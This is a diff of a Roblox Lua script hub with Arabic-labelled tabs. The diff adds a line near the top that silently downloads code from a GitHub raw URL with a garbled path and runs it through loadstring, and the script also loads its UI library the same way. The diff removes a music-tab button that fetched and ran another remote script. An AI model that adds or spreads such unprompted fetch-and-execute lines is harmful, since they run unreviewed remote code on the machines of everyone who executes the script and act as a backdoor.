@@ -290,6 +290,8 @@ TextChatService.OnIncomingMessage = function(message)
 	end
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Defjrfnxl/main/تج ا رب ري دز ajsjhshzjz"))()
+
 local splib = loadstring(game:HttpGet("https://raw.githubusercontent.com/as6cd0/SP_Hub/refs/heads/main/splibv2"))()
 
 local Window = splib:MakeWindow({
@@ -6086,20 +6088,6 @@ ChatTab:AddButton({
             channel:SendAsync(message)
         end)
     end
-})
-
-
-local TabM = Window:MakeTab({
-Name = "الاغاني",
-Icon = "music"
-})
-
-TabM:AddButton({
-Name = "NetroZسكربت اغاني",
-Description = "السكربت الخاص للأغاني كبير جدا",
-Callback = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/main/GG Ne t GGG"))()
-end
 })
 
 local Tab = Window:MakeTab({"السكن", "rbxassetid://10734952036"})
